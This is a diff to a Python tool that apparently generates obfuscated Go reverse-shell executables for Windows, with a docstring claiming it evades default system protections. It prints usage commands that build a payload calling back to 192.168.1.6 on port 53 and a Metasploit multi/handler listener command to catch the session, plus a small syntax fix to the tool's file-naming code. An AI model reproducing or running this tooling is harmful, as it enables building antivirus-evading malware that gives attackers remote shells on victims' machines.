@@ -19,7 +19,8 @@ Latest: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/
 payload: windows/x64/powershell_reverse_tcp
 evades default sys install.
 
-python3 Obfuscated_GoHex_ShellCreator.py -l 192.168.1.6 -p 53 --payload windows/x64/powershell_reverse_tcp 
+python3 Obfuscated_GoHex_ShellCreator.py -l 192.168.1.6 -p 53 --payload \
+windows/x64/powershell_reverse_tcp 
 ----- snip -----
 [+] Compiling:
 [+] Compressing binary: -> WSmiwnO.exe
@@ -28,8 +29,10 @@ python3 Obfuscated_GoHex_ShellCreator.py -l 192.168.1.6 -p 53 --payload windows/
 -rwxr-xr-x 1 dualfade dualfade 466K Mar  2 21:28 WSmiwnO.exe*
 
 MSF --
-sudo msfconsole -q -x "use exploit/multi/handler; set LHOST wlp59s0; set LPORT 53; set PAYLOAD \
-windows/x64/powershell_reverse_tcp; set EXITFUNC thread; set ExitOnSession false ; rexploit -j -z"
+sudo msfconsole -q -x "use exploit/multi/handler; set LHOST wlp59s0; \
+set LPORT 53; set PAYLOAD \
+windows/x64/powershell_reverse_tcp; \
+set EXITFUNC thread; set ExitOnSession false ; rexploit -j -z"
 """
 
 # import --
@@ -116,7 +119,7 @@ def Golang_Shell_Template():
         srand1=go_impo, srand2=go_main, srand3=go_func, Payload=msf_Payload)
 
     # random name --
-    goShell_fName = "".join(['/tmp/', str(go_rname], '.go']) 
+    goShell_fName = "".join(['/tmp/', str(go_rnam), '.go']) 
 
     # write --
     print("[+] Writing golang shell: -> %s" % goShell_fName)
